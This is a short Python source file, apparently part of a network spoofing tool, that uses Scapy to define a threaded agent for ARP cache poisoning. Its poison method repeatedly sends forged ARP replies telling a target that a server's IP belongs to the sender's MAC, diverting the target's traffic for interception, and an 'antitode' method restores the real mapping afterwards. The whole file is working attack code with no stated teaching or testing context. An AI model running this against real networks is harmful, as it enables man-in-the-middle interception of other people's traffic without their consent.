from scapy.all import *
import logging
import threading

TIMEOUT = 2
# stop_event = threading.Event() # not stop_event.is_set()

class arp_agent ( threading.Thread ):

	def __init__(self, op, target_ip, server_ip, mac ):
		super(arp_agent, self).__init__()
		self._stop_event = threading.Event()
		self.target_ip = target_ip
		self.server_ip = server_ip
		self.mac = mac
		self.op = op # operation: 1 poison, 0 antitode

	def stop(self):
		logging.info( "Stopping arp agent thread of target {}".format( self.target_ip ) )
		self._stop_event.set()

	def stopped(self):
		return self._stop_event.is_set()

	def run( self ):
		if ( self.op==1 ):
			self.poison( self.target_ip, self.server_ip, self.mac )
		elif ( self.op==0 ):
			self.antitode( self.target_ip, self.server_ip, self.mac )

	def poison( self, target_ip, server_ip, fake_server_mac ):
		logging.info ( "Begin ARP poisoning on {}..".format(target_ip) )

		arprq = ARP()
		arprq.psrc = server_ip # from IP
		arprq.pdst = target_ip # send to IP
		arprq.hwsrc = fake_server_mac # MY MAC
		arprq.op = 2 # arp rely THIS IP IS AT THIS MAC

		logging.info ( "Sending: {}".format( arprq.summary() ) )

		while ( not self.stopped() ):
			send( arprq, verbose=0 )
			time.sleep( TIMEOUT )
		return

	def antitode( self, target_ip, server_ip, real_server_mac ):
		logging.info ("ARP antitode on {}..".format(target_ip) )

		arprq = ARP()
		arprq.psrc = server_ip # from IP
		arprq.pdst = target_ip # send to IP
		arprq.hwsrc = real_server_mac # this is my mac MAC
		arprq.op = 2 # arp rely THIS IP IS AT THIS MAC

		# this is used only for cleanup
		send( arprq, count=8, verbose=0 )

		return
